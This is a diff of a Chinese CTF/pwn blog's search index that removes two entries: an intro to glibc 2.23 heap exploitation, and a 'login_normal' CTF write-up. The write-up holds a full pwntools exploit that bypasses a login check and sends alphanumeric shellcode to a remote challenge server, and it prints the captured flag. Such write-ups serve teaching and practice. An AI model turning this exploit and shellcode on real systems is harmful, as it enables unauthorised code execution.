@@ -4,38 +4,6 @@
   
   
   <entry>
-    <title>Glibc_2.23堆利用</title>
-    <link href="/2022/06/03/glibc_2.23/"/>
-    <url>/2022/06/03/glibc_2.23/</url>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>关于我为什么要写这篇博客，最近发现自己基础很薄弱，很久很久都没又好好的沉下心来去学习了，所以就打算好好总结一下堆利用</p><p>目前打算尽自己所能的一点一点写下去，从glibc2.23到glibc2.35,太难的利用手法可能我也很难写下来，先尽力的写一下常见的off_by_one,uaf这些常见的吧，至于能写到什么程度我也不知道。</p><h2 id="GLIBC2-23-off-by-one"><a href="#GLIBC2-23-off-by-one" class="headerlink" title="GLIBC2.23_off_by_one"></a>GLIBC2.23_off_by_one</h2>]]></content>
-    
-    
-    <categories>
-      
-      <category>PWN</category>
-      
-    </categories>
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title></title>
-    <link href="/2022/05/30/login_normal/"/>
-    <url>/2022/05/30/login_normal/</url>
-    
-    <content type="html"><![CDATA[<h2 id="login-normal"><a href="#login-normal" class="headerlink" title="login_normal"></a>login_normal</h2><p>思路：需要先绕过检查，然后登录root，随后往mmap出来的内存里写入shellcode就行，绕过方法写在exp里了</p><p>漏洞点：需要先将unk—202024置一，这里写入shellcode即可</p><p><img src="https://s1.328888.xyz/2022/05/29/t1kf0.png" alt="t1kf0.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>r = process(<span class="hljs-string">&quot;./login&quot;</span>)<br>r = remote(<span class="hljs-string">&quot;123.56.111.202&quot;</span>,<span class="hljs-number">17952</span>)<br>e = ELF(<span class="hljs-string">&quot;./login&quot;</span>)<br>libc = e.libc<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.slafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims             :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(ru(data)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(ru(data)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info_base = <span class="hljs-keyword">lambda</span> tag, base        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(base))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd</span>):<br>    gdb.attach(r,cmd)<br>    pause()<br><br><br>ru(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;opt:1\r\nmsg:ro0t\r\n&#x27;</span>)<br><br>shellcode =<span class="hljs-string">b&quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span><br><br>ru(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;opt:2\r\nmsg:&#x27;</span>+shellcode+<span class="hljs-string">b&#x27;\r\n&#x27;</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>打完忘记保存flag了，重新开了个容器打了一下：flag{21bdad30-bdf2-4301-9d19-05f0d732a70f}</p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>Dest0g3迎新赛wp及其复现</title>
     <link href="/2022/05/24/destdog/"/>
     <url>/2022/05/24/destdog/</url>
